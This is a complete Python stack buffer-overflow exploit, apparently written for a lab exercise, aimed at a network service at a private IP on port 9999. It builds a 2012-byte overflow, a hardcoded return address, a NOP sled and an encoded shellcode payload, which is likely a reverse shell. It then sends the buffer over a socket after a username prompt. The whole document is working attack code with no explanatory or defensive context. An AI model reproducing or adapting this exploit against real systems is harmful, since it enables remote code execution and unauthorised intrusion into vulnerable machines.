#!/bin/env python3
import socket

ip = "10.10.106.149"
port = 9999

offset = 2012
overflow = "A" * offset
retn = "\xDF\x14\x50\x62"
#625014DF
#padding = ""

# Adding NOOP
padding = "\x90"*20

payload = (
"\xdb\xc5\xd9\x74\x24\xf4\x5a\x33\xc9\xbb\x09\xc3\x35\x7a\xb1"
"\x52\x83\xea\xfc\x31\x5a\x13\x03\x53\xd0\xd7\x8f\x9f\x3e\x95"
"\x70\x5f\xbf\xfa\xf9\xba\x8e\x3a\x9d\xcf\xa1\x8a\xd5\x9d\x4d"
"\x60\xbb\x35\xc5\x04\x14\x3a\x6e\xa2\x42\x75\x6f\x9f\xb7\x14"
"\xf3\xe2\xeb\xf6\xca\x2c\xfe\xf7\x0b\x50\xf3\xa5\xc4\x1e\xa6"
"\x59\x60\x6a\x7b\xd2\x3a\x7a\xfb\x07\x8a\x7d\x2a\x96\x80\x27"
"\xec\x19\x44\x5c\xa5\x01\x89\x59\x7f\xba\x79\x15\x7e\x6a\xb0"
"\xd6\x2d\x53\x7c\x25\x2f\x94\xbb\xd6\x5a\xec\xbf\x6b\x5d\x2b"
"\xbd\xb7\xe8\xaf\x65\x33\x4a\x0b\x97\x90\x0d\xd8\x9b\x5d\x59"
"\x86\xbf\x60\x8e\xbd\xc4\xe9\x31\x11\x4d\xa9\x15\xb5\x15\x69"
"\x37\xec\xf3\xdc\x48\xee\x5b\x80\xec\x65\x71\xd5\x9c\x24\x1e"
"\x1a\xad\xd6\xde\x34\xa6\xa5\xec\x9b\x1c\x21\x5d\x53\xbb\xb6"
"\xa2\x4e\x7b\x28\x5d\x71\x7c\x61\x9a\x25\x2c\x19\x0b\x46\xa7"
"\xd9\xb4\x93\x68\x89\x1a\x4c\xc9\x79\xdb\x3c\xa1\x93\xd4\x63"
"\xd1\x9c\x3e\x0c\x78\x67\xa9\x39\x74\x67\x02\x56\x84\x67\x45"
"\xfa\x01\x81\x0f\x12\x44\x1a\xb8\x8b\xcd\xd0\x59\x53\xd8\x9d"
"\x5a\xdf\xef\x62\x14\x28\x85\x70\xc1\xd8\xd0\x2a\x44\xe6\xce"
"\x42\x0a\x75\x95\x92\x45\x66\x02\xc5\x02\x58\x5b\x83\xbe\xc3"
"\xf5\xb1\x42\x95\x3e\x71\x99\x66\xc0\x78\x6c\xd2\xe6\x6a\xa8"
"\xdb\xa2\xde\x64\x8a\x7c\x88\xc2\x64\xcf\x62\x9d\xdb\x99\xe2"
"\x58\x10\x1a\x74\x65\x7d\xec\x98\xd4\x28\xa9\xa7\xd9\xbc\x3d"
"\xd0\x07\x5d\xc1\x0b\x8c\x7d\x20\x99\xf9\x15\xfd\x48\x40\x78"
"\xfe\xa7\x87\x85\x7d\x4d\x78\x72\x9d\x24\x7d\x3e\x19\xd5\x0f"
"\x2f\xcc\xd9\xbc\x50\xc5")

postfix = ""

buffer = overflow + retn + padding + payload + postfix
#buffer = 'test'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  s.recv(1024)

  s.send(bytes("jacky\r\n", "latin-1"))
  s.recv(1024)
  s.send(bytes(buffer+"\r\n", "latin-1"))
  s.recv(1024)

  print("Done!")
except:
  print("Could not connect.")
finally:
  s.close()
